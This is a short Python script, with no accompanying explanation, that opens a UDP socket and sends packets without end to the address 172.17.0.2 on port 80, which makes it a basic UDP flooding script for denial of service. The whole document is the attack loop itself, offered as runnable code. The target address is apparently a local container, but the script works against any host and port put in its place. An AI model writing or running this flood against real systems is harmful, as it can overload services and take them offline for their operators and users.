import socket

target_ip = "172.17.0.2"
target_port = 80  # Or any other port

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

while True:
    udp_socket.sendto(b"Data", (target_ip, target_port))
